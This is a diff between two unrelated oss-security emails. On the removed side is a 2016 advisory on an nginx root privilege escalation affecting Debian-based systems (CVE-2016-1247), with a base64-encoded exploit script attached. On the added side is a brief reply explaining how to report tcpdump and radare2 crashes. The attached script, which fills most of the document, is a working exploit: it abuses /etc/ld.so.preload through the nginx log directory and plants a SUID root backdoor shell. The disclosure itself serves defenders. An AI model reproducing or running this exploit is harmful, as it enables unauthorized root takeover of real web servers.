@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["11200" "Wednesday" "16" "November" "2016" "01:15:02" "-0200" "Dawid Golunski" "dawid@legalhackers.com" "<CADSYzsvQ2ZZA6kKd3NWv5CFEu8RxrL=+q7zgtnoZa-x_fL9BeA@mail.gmail.com>" "202" "[oss-security] Nginx (Debian-based distros) - Root Privilege Escalation Vulnerability (CVE-2016-1247)" "^Date:" nil nil "11" "2016111603:15:02" "[oss-security] Nginx (Debian-based distros) - Root Privilege Escalation Vulnerability (CVE-2016-1247)" (number mark "U       dawid@legalh Nov 16  202/11200 " thread-indent "\"[oss-security] Nginx (Debian-based distros) - Root Privilege Escalation Vulnerability (CVE-2016-1247)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["768" "Wednesday" "31" "May" "2017" "13:16:15" "+0200" "Hanno =?UTF-8?B?QsO2Y2s=?=" "hanno@hboeck.de" "<20170531131615.58752cc0@pc1>" "29" "Re: [oss-security] I found Crash in tcpdump and radare2." "^Date:" nil nil "5" "2017053111:16:15" "[oss-security] I found Crash in tcpdump and radare2." (number mark "        hanno@hboeck May 31   29/768   " thread-indent "\"Re: [oss-security] I found Crash in tcpdump and radare2.\"\n") "<8XrcMd96kN_Nn_-TzYxWxS_29WZ5T4xj249Hg0NnH1FAaF42pe-_O32I4hSYnNChHMwPzFIhcsL5AQFCwYJmsCzaAC6QTgZtKwoXcGck-Rg=@protonmail.com>" ("<8XrcMd96kN_Nn_-TzYxWxS_29WZ5T4xj249Hg0NnH1FAaF42pe-_O32I4hSYnNChHMwPzFIhcsL5AQFCwYJmsCzaAC6QTgZtKwoXcGck-Rg=@protonmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0000
+X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 12172 invoked by uid 550); 16 Nov 2016 08:21:54 -0000
+Received: (qmail 25966 invoked by uid 550); 31 May 2017 11:16:29 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,239 +11,46 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 3799 invoked from network); 16 Nov 2016 03:15:15 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=legalhackers-com.20150623.gappssmtp.com; s=20150623;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=sEdzbmDl0yceaDwBwj66FqNDAXEDHO1CoRuzrttDg70=;
-        b=2S5X83gsF6cz8KmMVszdlo1QXECq9GEmD02/q/IELujVCo9Skqbj5VT9gCdthkt0g/
-         KKrMb77hbcbdV2WC0w+ftw/KhKQeO8ajoq5iGAwllyPWYC+/EaaN1Y8w/UmAc2/kA4I8
-         GXcK1qx4SMr+NmhV024bXkK1aSm6iwtT9HPM/0TGJPqF4s8Sg3BaCEWGS3sxBTQxvDT7
-         s3rXiZALQhMdU/U1dfsaIhtZOL8YwVHjXPdCHX6WMXoklPmISz0tzKF0O7xpIKj5n6B3
-         bsM19lU3eeRP+K1Q+WSl7B3P+wrmjhI+DtM7Q+BVI/05h7JB6Ih0S1Hp5xT1Q1rqzZV2
-         NfpA==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20130820;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=sEdzbmDl0yceaDwBwj66FqNDAXEDHO1CoRuzrttDg70=;
-        b=Ocea5vgXyojUKDL1WZgaB7gswfJwTJGej6DtLftSEbasI0VBn89fWpmw3KxjSmJNYA
-         m8auNZl8PIRozLsysQs4QC2tWKfpzAWP3G4Jwwb+S2y5bwBD0BfXj0TvLn7r6JiuCj6u
-         cxSc3E0aIhvp2TcofrlEthPX+g2u8LoVQolc/fmzE3xwbuH4u0HErdAaxkOqxl9oVrfw
-         qp+1v72XfgneH2JNFPn3+OVewgcqq+zLMRhOU5DzYOPUkmIFzb1wlDVO/f0xCwjrH8og
-         UimkNDz2OzZ3GCl/gPdI7vOcXeVkb4rwso1bN7VV7DQEL/Mig+1E/4x4P7a4F1vp6EIz
-         Dtvg==
-X-Gm-Message-State: ABUngvdzkI8D2rNCRq28ekkXPI2jQOZIXWu+2V48AIcvo41SE28a7Kxg7LDHzpImVXfnEBNZEawkwRCOurI/iw==
-X-Received: by 10.159.36.179 with SMTP id 48mr445143uar.80.1479266102823; Tue,
- 15 Nov 2016 19:15:02 -0800 (PST)
+Received: (qmail 25939 invoked from network); 31 May 2017 11:16:28 -0000
+Message-ID: <20170531131615.58752cc0@pc1>
+In-Reply-To: <8XrcMd96kN_Nn_-TzYxWxS_29WZ5T4xj249Hg0NnH1FAaF42pe-_O32I4hSYnNChHMwPzFIhcsL5AQFCwYJmsCzaAC6QTgZtKwoXcGck-Rg=@protonmail.com>
+References: <8XrcMd96kN_Nn_-TzYxWxS_29WZ5T4xj249Hg0NnH1FAaF42pe-_O32I4hSYnNChHMwPzFIhcsL5AQFCwYJmsCzaAC6QTgZtKwoXcGck-Rg=@protonmail.com>
+X-Mailer: Claws Mail 3.15.0-dirty (GTK+ 2.24.31; x86_64-pc-linux-gnu)
 MIME-Version: 1.0
-Message-ID: <CADSYzsvQ2ZZA6kKd3NWv5CFEu8RxrL=+q7zgtnoZa-x_fL9BeA@mail.gmail.com>
-Content-Type: multipart/mixed; boundary=001a113d0d089677bf0541627a7a
-Date: Wed, 16 Nov 2016 01:15:02 -0200
-From: Dawid Golunski <dawid@legalhackers.com>
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+Date: Wed, 31 May 2017 13:16:15 +0200
+From: Hanno =?UTF-8?B?QsO2Y2s=?= <hanno@hboeck.de>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Nginx (Debian-based distros) - Root Privilege Escalation
- Vulnerability (CVE-2016-1247)
+Subject: Re: [oss-security] I found Crash in tcpdump and radare2.
 To: oss-security@lists.openwall.com
 
---001a113d0d089677bf0541627a7a
-Content-Type: text/plain; charset=UTF-8
+Hi,
 
-Vulnerability: Nginx (Debian-based distros) - Root Privilege
-Escalation Exploit (CVE-2016-1247)
+On Wed, 31 May 2017 06:39:12 -0400
+Qhdwns123 <qhdwns123@protonmail.com> wrote:
 
-Discovered by: Dawid Golunski (@dawid_golunski)
-https://legalhackers.com
+> I found Crash in tcpdump and radare2.
+>=20
+> It points to the heap overflow as the result of analysis by ASAN.
+>=20
+> What steps should I take to report this issue?
 
-Nginx web server packaging on Debian-based distributions such as Debian or
-Ubuntu was found to create log directories with insecure permissions which
-can be exploited by malicious local attackers to escalate their privileges
-from nginx/web user (www-data) to root.
-The vulnerability could be easily exploited by attackers who have managed to
-compromise a web application hosted on Nginx server and gained access to
-www-data account to escalate their privileges to root without any
-admin interaction thanks to cron.daily.
+Please report the issues first to their respective developers and
+provide the crashing files to them.
 
-Vulnerability fixed in the following packages:
-Nginx 1.6.2-5+deb8u3 package on Debian
-Nginx 1.10.0-0ubuntu0.16.04.3 on Ubuntu (16.04 LTS)
+tcpdump has a contact address for security issues:
+http://www.tcpdump.org/#security
 
+I think radare2 has no specific security reporting process, you can
+report it through their github tracker:
+https://github.com/radare/radare2/issues
 
-The up-to-date advisory can be found at:
+When the bugs are fixed you can post details to this list.
 
-https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+--=20
+Hanno B=C3=B6ck
+https://hboeck.de/
 
-For updates, follow:
-
-https://twitter.com/dawid_golunski
-
-Copy of the exploit is also attached to this message.
-
---001a113d0d089677bf0541627a7a
-Content-Type: application/x-sh; name="nginxed-root.sh"
-Content-Disposition: attachment; filename="nginxed-root.sh"
-Content-Transfer-Encoding: base64
-X-Attachment-Id: f_ivkcqy860
-
-IyEvYmluL2Jhc2gKIwojIE5naW54IChEZWJpYW4tYmFzZWQgZGlzdHJvcykg
-LSBSb290IFByaXZpbGVnZSBFc2NhbGF0aW9uIFBvQyBFeHBsb2l0CiMgbmdp
-bnhlZC1yb290LnNoICh2ZXIuIDEuMCkKIwojIENWRS0yMDE2LTEyNDcKIwoj
-IERpc2NvdmVyZWQgYW5kIGNvZGVkIGJ5OgojCiMgRGF3aWQgR29sdW5za2kK
-IyBkYXdpZFthdF1sZWdhbGhhY2tlcnMuY29tCiMKIyBodHRwczovL2xlZ2Fs
-aGFja2Vycy5jb20KIwojIEZvbGxvdyBodHRwczovL3R3aXR0ZXIuY29tL2Rh
-d2lkX2dvbHVuc2tpIGZvciB1cGRhdGVzIG9uIHRoaXMgYWR2aXNvcnkuCiMK
-IyAtLS0KIyBUaGlzIFBvQyBleHBsb2l0IGFsbG93cyBsb2NhbCBhdHRhY2tl
-cnMgb24gRGViaWFuLWJhc2VkIHN5c3RlbXMgKERlYmlhbiwgVWJ1bnR1CiMg
-ZXRjLikgdG8gZXNjYWxhdGUgdGhlaXIgcHJpdmlsZWdlcyBmcm9tIG5naW54
-IHdlYiBzZXJ2ZXIgdXNlciAod3d3LWRhdGEpIHRvIHJvb3QgCiMgdGhyb3Vn
-aCB1bnNhZmUgZXJyb3IgbG9nIGhhbmRsaW5nLgojCiMgVGhlIGV4cGxvaXQg
-d2FpdHMgZm9yIE5naW54IHNlcnZlciB0byBiZSByZXN0YXJ0ZWQgb3IgcmVj
-ZWl2ZSBhIFVTUjEgc2lnbmFsLgojIE9uIERlYmlhbi1iYXNlZCBzeXN0ZW1z
-IHRoZSBVU1IxIHNpZ25hbCBpcyBzZW50IGJ5IGxvZ3JvdGF0ZSAoL2V0Yy9s
-b2dyb3RhdGUuZC9uZ2lueCkKIyBzY3JpcHQgd2hpY2ggaXMgY2FsbGVkIGRh
-aWx5IGJ5IHRoZSBjcm9uLmRhaWx5IG9uIGRlZmF1bHQgaW5zdGFsbGF0aW9u
-cy4KIyBUaGUgcmVzdGFydCBzaG91bGQgdGFrZSBwbGFjZSBhdCA2OjI1YW0g
-d2hpY2ggaXMgd2hlbiBjcm9uLmRhaWx5IGV4ZWN1dGVzLgojIEF0dGFja2Vy
-cyBjYW4gdGhlcmVmb3JlIGdldCBhIHJvb3Qgc2hlbGwgYXV0b21hdGljYWxs
-eSBpbiAyNGggYXQgbW9zdCB3aXRob3V0IGFueSBhZG1pbgojIGludGVyYWN0
-aW9uIGp1c3QgYnkgbGV0dGluZyB0aGUgZXhwbG9pdCBydW4gdGlsbCA2OjI1
-YW0gYXNzdW1pbmcgdGhhdCBkYWlseSBsb2dyb3RhdGlvbiAKIyBoYXMgYmVl
-biBjb25maWd1cmVkLiAKIwojCiMgRXhwbG9pdCB1c2FnZToKIyAuL25naW54
-ZWQtcm9vdC5zaCBwYXRoX3RvX25naW54X2Vycm9yLmxvZyAKIwojIFRvIHRy
-aWdnZXIgbG9ncm90YXRpb24gZm9yIHRlc3RpbmcgdGhlIGV4cGxvaXQsIHlv
-dSBjYW4gcnVuIHRoZSBmb2xsb3dpbmcgY29tbWFuZDoKIwojIC91c3Ivc2Jp
-bi9sb2dyb3RhdGUgLXZmIC9ldGMvbG9ncm90YXRlLmQvbmdpbngKIwojIFNl
-ZSB0aGUgZnVsbCBhZHZpc29yeSBmb3IgZGV0YWlscyBhdDoKIyBodHRwczov
-L2xlZ2FsaGFja2Vycy5jb20vYWR2aXNvcmllcy9OZ2lueC1FeHBsb2l0LURl
-Yi1Sb290LVByaXZFc2MtQ1ZFLTIwMTYtMTI0Ny5odG1sCiMKIyBWaWRlbyBQ
-b0M6CiMgaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tL3ZpZGVvcy9OZ2lueC1F
-eHBsb2l0LURlYi1Sb290LVByaXZFc2MtQ1ZFLTIwMTYtMTI0Ny5odG1sCiMK
-IwojIERpc2NsYWltZXI6CiMgRm9yIHRlc3RpbmcgcHVycG9zZXMgb25seS4g
-RG8gbm8gaGFybS4KIwoKQkFDS0RPT1JTSD0iL2Jpbi9iYXNoIgpCQUNLRE9P
-UlBBVEg9Ii90bXAvbmdpbnhyb290c2giClBSSVZFU0NMSUI9Ii90bXAvcHJp
-dmVzY2xpYi5zbyIKUFJJVkVTQ1NSQz0iL3RtcC9wcml2ZXNjbGliLmMiClNV
-SURCSU49Ii91c3IvYmluL3N1ZG8iCgpmdW5jdGlvbiBjbGVhbmV4aXQgewoJ
-IyBDbGVhbnVwIAoJZWNobyAtZSAiXG5bK10gQ2xlYW5pbmcgdXAuLi4iCgly
-bSAtZiAkUFJJVkVTQ1NSQwoJcm0gLWYgJFBSSVZFU0NMSUIKCXJtIC1mICRF
-UlJPUkxPRwoJdG91Y2ggJEVSUk9STE9HCglpZiBbIC1mIC9ldGMvbGQuc28u
-cHJlbG9hZCBdOyB0aGVuCgkJZWNobyAtbiA+IC9ldGMvbGQuc28ucHJlbG9h
-ZAoJZmkKCWVjaG8gLWUgIlxuWytdIEpvYiBkb25lLiBFeGl0aW5nIHdpdGgg
-Y29kZSAkMSBcbiIKCWV4aXQgJDEKfQoKZnVuY3Rpb24gY3RybF9jKCkgewog
-ICAgICAgIGVjaG8gLWUgIlxuWytdIEN0cmwrQyBwcmVzc2VkIgoJY2xlYW5l
-eGl0IDAKfQoKI2ludHJvIAoKY2F0IDw8X2Vhc2NpaV8KIF9fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX18KPCBJcyB5b3VyIHNlcnZlciAoTilqaW54
-ZWQgPyA7byA+CiAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiAg
-ICAgICAgICAgXCAKICAgICAgICAgICAgXCAgICAgICAgICBfXy0tLV9fCiAg
-ICAgICAgICAgICAgICAgICAgXy0gICAgICAgLy0tX19fX19fCiAgICAgICAg
-ICAgICAgIF9fLS0oIC8gICAgIFwgKVhYWFhYWFhYWFhYXHYuICAKICAgICAg
-ICAgICAgIC4tWFhYKCAgIE8gICBPICApWFhYWFhYWFhYWFhYWFhYLSAKICAg
-ICAgICAgICAgL1hYWCggICAgICAgVSAgICAgKSAgICAgICAgWFhYWFhYWFwg
-CiAgICAgICAgICAvWFhYWFgoICAgICAgICAgICAgICApLS1fICBYWFhYWFhY
-WFhYWFwgCiAgICAgICAgIC9YWFhYWC8gKCAgICAgIE8gICAgICkgICBYWFhY
-WFggICBcWFhYWFhcIAogICAgICAgICBYWFhYWC8gICAvICAgICAgICAgICAg
-WFhYWFhYICAgXF9fIFxYWFhYWAogICAgICAgICBYWFhYWFhfXy8gICAgICAg
-ICAgWFhYWFhYICAgICAgICAgXF9fLS0tLT4KIC0tLV9fXyAgWFhYX18vICAg
-ICAgICAgIFhYWFhYWCAgICAgIFxfXyAgICAgICAgIC8KICAgXC0gIC0tX18v
-ICAgX19fL1wgIFhYWFhYWCAgICAgICAgICAgIC8gIF9fXy0tLz0KICAgIFwt
-XCAgICBfX18vICAgIFhYWFhYWCAgICAgICAgICAgICAgJy0tLSBYWFhYWFgK
-ICAgICAgIFwtXC9YWFhcIFhYWFhYWCAgICAgICAgICAgICAgICAgICAgICAv
-WFhYWFgKICAgICAgICAgXFhYWFhYWFhYWCAgIFwgICAgICAgICAgICAgICAg
-ICAgIC9YWFhYWC8KICAgICAgICAgIFxYWFhYWFggICAgICA+ICAgICAgICAg
-ICAgICAgICBfL1hYWFhYLwogICAgICAgICAgICBcWFhYWFgtLV9fLyAgICAg
-ICAgICAgICAgX18tLSBYWFhYLwogICAgICAgICAgICAgLVhYWFhYWFhYLS0t
-LS0tLS0tLS0tLS0tICBYWFhYWFgtCiAgICAgICAgICAgICAgICBcWFhYWFhY
-WFhYWFhYWFhYWFhYWFhYWFhYWFgvCiAgICAgICAgICAgICAgICAgICIiVlhY
-WFhYWFhYWFhYWFhYWFhYWFYiIgpfZWFzY2lpXwoKZWNobyAtZSAiXDAzM1s5
-NG0gXG5OZ2lueCAoRGViaWFuLWJhc2VkIGRpc3Ryb3MpIC0gUm9vdCBQcml2
-aWxlZ2UgRXNjYWxhdGlvbiBQb0MgRXhwbG9pdCAoQ1ZFLTIwMTYtMTI0Nykg
-XG5uZ2lueGVkLXJvb3Quc2ggKHZlci4gMS4wKVxuIgplY2hvIC1lICJEaXNj
-b3ZlcmVkIGFuZCBjb2RlZCBieTogXG5cbkRhd2lkIEdvbHVuc2tpIFxuaHR0
-cHM6Ly9sZWdhbGhhY2tlcnMuY29tIFwwMzNbMG0iCgojIEFyZ3MKaWYgWyAk
-IyAtbHQgMSBdOyB0aGVuCgllY2hvIC1lICJcblshXSBFeHBsb2l0IHVzYWdl
-OiBcblxuJDAgcGF0aF90b19lcnJvci5sb2cgXG4iCgllY2hvIC1lICJJdCBz
-ZWVtcyB0aGF0IHRoaXMgc2VydmVyIHVzZXM6IGBwcyBhdXggfCBncmVwIG5n
-aW54IHwgYXdrIC1GJ2xvZy1lcnJvcj0nICd7IHByaW50ICQyIH0nIHwgY3V0
-IC1kJyAnIC1mMSB8IGdyZXAgJy8nYFxuIgoJZXhpdCAzCmZpCgojIFByaXYg
-Y2hlY2sKCmVjaG8gLWUgIlxuWytdIFN0YXJ0aW5nIHRoZSBleHBsb2l0IGFz
-OiBcblwwMzNbOTRtYGlkYFwwMzNbMG0iCmlkIHwgZ3JlcCAtcSB3d3ctZGF0
-YQppZiBbICQ/IC1uZSAwIF07IHRoZW4KCWVjaG8gLWUgIlxuWyFdIFlvdSBu
-ZWVkIHRvIGV4ZWN1dGUgdGhlIGV4cGxvaXQgYXMgd3d3LWRhdGEgdXNlciEg
-RXhpdGluZy5cbiIKCWV4aXQgMwpmaQoKIyBTZXQgdGFyZ2V0IHBhdGhzCkVS
-Uk9STE9HPSIkMSIKaWYgWyAhIC1mICRFUlJPUkxPRyBdOyB0aGVuCgllY2hv
-IC1lICJcblshXSBUaGUgc3BlY2lmaWVkIE5naW54IGVycm9yIGxvZyAoJEVS
-Uk9STE9HKSBkb2Vzbid0IGV4aXN0LiBUcnkgYWdhaW4uXG4iCglleGl0IDMK
-ZmkKCiMgWyBFeHBsb2l0YXRpb24gXQoKdHJhcCBjdHJsX2MgSU5UCiMgQ29t
-cGlsZSBwcml2ZXNjIHByZWxvYWQgbGlicmFyeQplY2hvIC1lICJcblsrXSBD
-b21waWxpbmcgdGhlIHByaXZlc2Mgc2hhcmVkIGxpYnJhcnkgKCRQUklWRVND
-U1JDKSIKY2F0IDw8X3NvbGliZW9mXz4kUFJJVkVTQ1NSQwojZGVmaW5lIF9H
-TlVfU09VUkNFCiNpbmNsdWRlIDxzdGRpby5oPgojaW5jbHVkZSA8c3lzL3N0
-YXQuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgojaW5jbHVkZSA8ZGxmY24uaD4K
-ICAgICAgICNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KICAgICAgICNpbmNsdWRl
-IDxzeXMvc3RhdC5oPgogICAgICAgI2luY2x1ZGUgPGZjbnRsLmg+Cgp1aWRf
-dCBnZXRldWlkKHZvaWQpIHsKCXN0YXRpYyB1aWRfdCAgKCpvbGRfZ2V0ZXVp
-ZCkoKTsKCW9sZF9nZXRldWlkID0gZGxzeW0oUlRMRF9ORVhULCAiZ2V0ZXVp
-ZCIpOwoJaWYgKCBvbGRfZ2V0ZXVpZCgpID09IDAgKSB7CgkJY2hvd24oIiRC
-QUNLRE9PUlBBVEgiLCAwLCAwKTsKCQljaG1vZCgiJEJBQ0tET09SUEFUSCIs
-IDA0Nzc3KTsKCQl1bmxpbmsoIi9ldGMvbGQuc28ucHJlbG9hZCIpOwoJfQoJ
-cmV0dXJuIG9sZF9nZXRldWlkKCk7Cn0KX3NvbGliZW9mXwovYmluL2Jhc2gg
-LWMgImdjYyAtV2FsbCAtZlBJQyAtc2hhcmVkIC1vICRQUklWRVNDTElCICRQ
-UklWRVNDU1JDIC1sZGwiCmlmIFsgJD8gLW5lIDAgXTsgdGhlbgoJZWNobyAt
-ZSAiXG5bIV0gRmFpbGVkIHRvIGNvbXBpbGUgdGhlIHByaXZlc2MgbGliICRQ
-UklWRVNDU1JDLiIKCWNsZWFuZXhpdCAyOwpmaQoKCiMgUHJlcGFyZSBiYWNr
-ZG9vciBzaGVsbApjcCAkQkFDS0RPT1JTSCAkQkFDS0RPT1JQQVRICmVjaG8g
-LWUgIlxuWytdIEJhY2tkb29yL2xvdy1wcml2IHNoZWxsIGluc3RhbGxlZCBh
-dDogXG5gbHMgLWwgJEJBQ0tET09SUEFUSGAiCgojIFNhZmV0eSBjaGVjawpp
-ZiBbIC1mIC9ldGMvbGQuc28ucHJlbG9hZCBdOyB0aGVuCgllY2hvIC1lICJc
-blshXSAvZXRjL2xkLnNvLnByZWxvYWQgYWxyZWFkeSBleGlzdHMuIEV4aXRp
-bmcgZm9yIHNhZmV0eS4iCglleGl0IDIKZmkKCiMgU3ltbGluayB0aGUgbG9n
-IGZpbGUKcm0gLWYgJEVSUk9STE9HICYmIGxuIC1zIC9ldGMvbGQuc28ucHJl
-bG9hZCAkRVJST1JMT0cKaWYgWyAkPyAtbmUgMCBdOyB0aGVuCgllY2hvIC1l
-ICJcblshXSBDb3VsZG4ndCByZW1vdmUgdGhlICRFUlJPUkxPRyBmaWxlIG9y
-IGNyZWF0ZSBhIHN5bWxpbmsuIgoJY2xlYW5leGl0IDMKZmkKZWNobyAtZSAi
-XG5bK10gVGhlIHNlcnZlciBhcHBlYXJzIHRvIGJlIFwwMzNbOTRtKE4pamlu
-eGVkXDAzM1swbSAod3JpdGFibGUgbG9nZGlyKSAhIDopIFN5bWxpbmsgY3Jl
-YXRlZCBhdDogXG5gbHMgLWwgJEVSUk9STE9HYCIKCiMgTWFrZSBzdXJlIHRo
-ZSBuZ2lueCBhY2Nlc3MubG9nIGNvbnRhaW5zIGF0IGxlYXN0IDEgbGluZSBm
-b3IgdGhlIGxvZ3JvdGF0aW9uIHRvIGdldCB0cmlnZ2VyZWQKY3VybCBodHRw
-Oi8vbG9jYWxob3N0LyA+L2Rldi9udWxsIDI+L2Rldi9udWxsCiMgV2FpdCBm
-b3IgTmdpbnggdG8gcmUtb3BlbiB0aGUgbG9ncy9VU1IxIHNpZ25hbCBhZnRl
-ciB0aGUgbG9ncm90YXRpb24gKGlmIGRhaWx5IAojIHJvdGF0aW9uIGlzIGVu
-YWJsZSBpbiBsb2dyb3RhdGUgY29uZmlnIGZvciBuZ2lueCwgdGhpcyBzaG91
-bGQgaGFwcGVuIHdpdGhpbiAyNGggYXQgNjoyNWFtKQplY2hvIC1uZSAiXG5b
-K10gV2FpdGluZyBmb3IgTmdpbnggc2VydmljZSB0byBiZSByZXN0YXJ0ZWQg
-KC1VU1IxKSBieSBsb2dyb3RhdGUgY2FsbGVkIGZyb20gY3Jvbi5kYWlseSBh
-dCA2OjI1YW0uLi4iCndoaWxlIDo7IGRvIAoJc2xlZXAgMQoJaWYgWyAtZiAv
-ZXRjL2xkLnNvLnByZWxvYWQgXTsgdGhlbgoJCWVjaG8gJFBSSVZFU0NMSUIg
-PiAvZXRjL2xkLnNvLnByZWxvYWQKCQlybSAtZiAkRVJST1JMT0cKCQlicmVh
-azsKCWZpCmRvbmUKCiMgL2V0Yy9sZC5zby5wcmVsb2FkIHNob3VsZCBiZSBv
-d25lZCBieSB3d3ctZGF0YSB1c2VyIGF0IHRoaXMgcG9pbnQKIyBJbmplY3Qg
-dGhlIHByaXZlc2Muc28gc2hhcmVkIGxpYnJhcnkgdG8gZXNjYWxhdGUgcHJp
-dmlsZWdlcwplY2hvICRQUklWRVNDTElCID4gL2V0Yy9sZC5zby5wcmVsb2Fk
-CmVjaG8gLWUgIlxuWytdIE5naW54IHJlc3RhcnRlZC4gVGhlIC9ldGMvbGQu
-c28ucHJlbG9hZCBmaWxlIGdvdCBjcmVhdGVkIHdpdGggd2ViIHNlcnZlciBw
-cml2aWxlZ2VzOiBcbmBscyAtbCAvZXRjL2xkLnNvLnByZWxvYWRgIgplY2hv
-IC1lICJcblsrXSBBZGRpbmcgJFBSSVZFU0NMSUIgc2hhcmVkIGxpYiB0byAv
-ZXRjL2xkLnNvLnByZWxvYWQiCmVjaG8gLWUgIlxuWytdIFRoZSAvZXRjL2xk
-LnNvLnByZWxvYWQgZmlsZSBub3cgY29udGFpbnM6IFxuYGNhdCAvZXRjL2xk
-LnNvLnByZWxvYWRgIgpjaG1vZCA3NTUgL2V0Yy9sZC5zby5wcmVsb2FkCgoj
-IEVzY2FsYXRpbmcgcHJpdmlsZWdlcyB2aWEgdGhlIFNVSUQgYmluYXJ5IChl
-LmcuIC91c3IvYmluL3N1ZG8pCmVjaG8gLWUgIlxuWytdIEVzY2FsYXRpbmcg
-cHJpdmlsZWdlcyB2aWEgdGhlICRTVUlEQklOIFNVSUQgYmluYXJ5IHRvIGdl
-dCByb290ISIKc3VkbyAyPi9kZXYvbnVsbCA+L2Rldi9udWxsCgojIENoZWNr
-IGZvciB0aGUgcm9vdHNoZWxsCmxzIC1sICRCQUNLRE9PUlBBVEgKbHMgLWwg
-JEJBQ0tET09SUEFUSCB8IGdyZXAgcndzIHwgZ3JlcCAtcSByb290CmlmIFsg
-JD8gLWVxIDAgXTsgdGhlbiAKCWVjaG8gLWUgIlxuWytdIFJvb3RzaGVsbCBn
-b3QgYXNzaWduZWQgcm9vdCBTVUlEIHBlcm1zIGF0OiBcbmBscyAtbCAkQkFD
-S0RPT1JQQVRIYCIKCWVjaG8gLWUgIlxuXDAzM1s5NG1UaGUgc2VydmVyIGlz
-IChOKWppbnhlZCAhIDspIEdvdCByb290IHZpYSBOZ2lueCFcMDMzWzBtIgpl
-bHNlCgllY2hvIC1lICJcblshXSBGYWlsZWQgdG8gZ2V0IHJvb3QiCgljbGVh
-bmV4aXQgMgpmaQoKcm0gLWYgJEVSUk9STE9HCmVjaG8gPiAkRVJST1JMT0cK
-IAojIFVzZSB0aGUgcm9vdHNoZWxsIHRvIHBlcmZvcm0gY2xlYW51cCB0aGF0
-IHJlcXVpcmVzIHJvb3QgcHJpdmlsZ2VzCiRCQUNLRE9PUlBBVEggLXAgLWMg
-InJtIC1mIC9ldGMvbGQuc28ucHJlbG9hZDsgcm0gLWYgJFBSSVZFU0NMSUIi
-CiMgUmVzZXQgdGhlIGxvZ2dpbmcgdG8gZXJyb3IubG9nCiRCQUNLRE9PUlBB
-VEggLXAgLWMgImtpbGwgLVVTUjEgYHBpZG9mIC1zIG5naW54YCIKCiMgRXhl
-Y3V0ZSB0aGUgcm9vdHNoZWxsCmVjaG8gLWUgIlxuWytdIFNwYXduaW5nIHRo
-ZSByb290c2hlbGwgJEJBQ0tET09SUEFUSCBub3chIFxuIgokQkFDS0RPT1JQ
-QVRIIC1wIC1pCgojIEpvYiBkb25lLgpjbGVhbmV4aXQgMAo=
-
---001a113d0d089677bf0541627a7a--
+mail/jabber: hanno@hboeck.de
+GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
